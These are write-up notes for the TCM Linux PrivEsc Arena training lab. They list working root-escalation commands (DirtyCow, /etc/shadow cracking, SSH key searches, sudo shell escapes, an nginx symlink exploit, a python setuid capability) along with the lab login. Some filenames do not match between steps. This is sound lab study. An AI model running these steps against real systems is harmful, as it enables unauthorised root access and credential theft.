> Linux PrivEsc Arena | TheCyberMentor

## SSH Credentails 

TCM:Hacker123

Running linux-exploit-suggester we got `dirtycow` exploit.

# Kernel Exploits

gcc -pthread /home/user/tools/dirtycow/c0w.c -o cow
./c0w

Wait for some time

```
passwd
id => And we are root
```

# Weak File Permissions

ls -la /etc/shadow

```
-rw-rw-r-- 1 root shadow 809 Jun 17 23:33 /etc/shadow
```

Copy the /etc/passwd and /etc/shadow to our local machine and `unshadow password.txt shadow.txt > unshadow.txt`

hashcat -m 1800 unshadowed.txt rockyou.txt -O

# SSH keys

Search for SSH keys 

find / -name id_rsa 2>/dev/null
find / -name authorized_keys 2>/dev/null

```
/backups/supersecretkeys/id_rsa
```

# Privilege Escalation

sudo -l

```
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```
We can choose any of these to get access.

a. sudo find /bin -name nano -exec /bin/sh \;
b. sudo awk 'BEGIN {system("/bin/sh")}'
c. echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
d. sudo vim -c '!sh

# Symlinks

## Detection

dpkg -l | grep nginx

`ii  nginx-common                        1.6.2-5+deb8u2~bpo70+1       small, powerful, scalable web/proxy server - common files
ii  nginx-full                          1.6.2-5+deb8u2~bpo70+1       nginx web/proxy server (standard version)
`

Installed nginx version is below 1.6.2-5+deb8u3.

## Exploit

su -l www-data
/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log

The log is waiting to be rotated.

So open another session and login as root.

And `invoke-rc.d nginx rotate >/dev/null 2>&1` to rotate the log.

And we have the exploit!!

# Capabilities


## Detection

getcap -r / 2>/dev/null

`/usr/bin/python2.6 = cap_setuid+ep`

## Exploit

/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'

And we are root!